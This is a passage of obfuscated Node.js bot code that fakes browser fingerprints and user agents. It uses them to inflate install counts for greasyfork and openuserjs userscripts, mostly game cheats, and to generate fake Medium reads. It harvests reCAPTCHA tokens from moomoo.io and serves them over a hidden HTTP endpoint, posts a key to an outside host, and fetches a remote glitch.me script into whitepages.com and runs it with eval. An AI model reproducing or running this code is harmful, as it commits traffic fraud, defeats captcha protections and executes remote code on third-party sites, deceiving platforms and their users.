      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + Z(0x12) + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + Z(0x6) + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + Y(0x4) + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => 0x183b * -0x1 + -0x2c * 0x16 + 0x1c03
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    const b6 = {
      f: 'Zq^4'
    };
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](-0x103 * -0x10 + 0xf * 0x208 + -0x2ea8)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, 0x2b * 0x97 + 0x1ca7 + -0x35a0), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, -0x1dd7 + -0x967 * 0x3 + -0x5 * -0xbb0), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = -0x194a + -0x5f * -0xd + 0x1477;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = 0x49 * 0xb + 0x239 * 0xe + 0x1 * -0x2241; w < getRandomInt(-0x1 * 0x371 + 0x2145 + -0x1dd3, 0x5 * -0x7d + -0xddc + 0x2 * 0x829); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(0x1d5d * 0x3 + -0x190d7 + 0xc * 0x2d98);
        }
      }();
    }, -0x765 + 0x15d5 + -0xe0c), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      const a0 = b;

      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = -0x1535 + 0x14e3 + 0x52;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](0xc49 * -0x1 + 0x15d2 + -0x989, -0x20a0 + 0x40 * -0x6b + -0x19 * -0x262)), !z[a0(0x10, b6.f)]('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          const a1 = b;
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': a1(0xe, ')urQ')
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, 0x2 * 0x1f4f + -0xb187 + 0xe819);
    }, -0x6f * -0x9 + -0x1d77 + 0x19f4), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        const a2 = b;
        try {
          let s = -0x1 * -0x2393 + 0x1 * -0x1e1c + -0x577;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(-0x995 * -0x4 + 0x2 * 0x122e + 0x4 * -0xfbe), await u[a2(0xf, '6hrd')](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', 0x20a1 + 0x1 * 0x3c7 + -0x14 * 0x1d2), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(0x14dbfc + -0x2e23 * 0x81 + 0x1 * 0x101f47);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, 0x11 * 0x1a2 + -0x11c5 * 0x1 + -0x999);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](-0x34 * -0x9b + -0x177f + -0x735);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || -0x13 * -0x2cf + -0x3d1e + -0x5 * -0x7dd);
}
doFlags['doOUJS'] && ((async () => {
  const a5 = c,
    a4 = b;
  async function f() {
    const a3 = d,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = 0x1607 + 0x316 * 0x6 + -0x288a) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (0xf1 * 0x23 + 0x59 * -0x9 + -0x1dd1));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](-0x106f + -0x29b * 0x2 + 0x1 * 0x15a5, D['indexOf']('\x20'));
        return B ? E['slice'](0xb3 * 0x4 + 0x2c1 + -0xcb * 0x7, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](-0x1 * 0x1b4f + -0x1141 + 0x53a0),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](0xc1 * 0x5b + -0x343f + 0x16b4),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': a3(0xa)
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + a4(0x1, 'omeD') + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      a5(0xc) + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = -0x7e9 + 0x1d7b * 0x1 + -0x1592 * 0x1; k < 0x8c + -0x174b + 0x16c3 * 0x1; k++)
    setTimeout(f, (0x7 * -0x3fa6 + 0x10614 + 0x1a1d6) * k * getRandomInt(-0x1 * 0x1f03 + 0x46 * 0x6 + -0x5 * -0x5e0, -0xbed * 0x2 + 0xaab + 0x3 * 0x466));
  setInterval(() => {
    f();
    for (let l = 0x26f * 0x6 + -0x4 * 0x6d4 + 0xcb6; l < -0x2195 * -0x1 + 0x11c0 * -0x1 + -0x1 * 0xfd1; l++)
      setTimeout(f, (0x6ff5 * -0x2 + 0x1 * 0x18cdf + 0x3d6b) * l * getRandomInt(0x1 * -0x24df + 0x2 * 0x12a4 + -0x2 * 0x34, 0x185 * 0x3 + 0xfce + -0x145a));
  }, -0x2686b5 + -0x3209 * 0x137 + -0x9a3e24 * -0x1);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
